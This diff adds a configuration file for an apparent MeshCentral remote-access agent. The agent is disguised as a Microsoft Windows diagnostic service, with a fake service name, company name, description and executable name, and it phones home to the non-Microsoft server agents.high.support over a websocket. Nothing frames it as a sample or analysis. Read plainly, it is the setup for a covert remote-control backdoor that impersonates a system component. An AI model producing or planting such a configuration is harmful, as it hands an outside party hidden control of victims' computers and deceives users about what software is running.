@@ -1,0 +1,10 @@
+MeshName=Windows Diagnostics
+MeshType=2
+MeshID=0x5EF6C8D64DA061FD8FA18F023CA11F8BF0DB8829D0C70943A9B7B6A4C75D04BBECB5C3FBE20579C8A9B6A94A106AFB19
+ServerID=EE1022AB3A8C5012E9D31A0E3655F3F795D723D80D25B21F8416B062853E2BD242CA44C33AEA681E87E3637DFA1E2DE7
+MeshServer=wss://agents.high.support:4445/agent.ashx
+meshServiceName=WinDiagnosticHost
+displayName=Windows Diagnostic Host Service
+companyName=Microsoft Corporation
+description=system health monitoring
+fileName=diaghost.exe
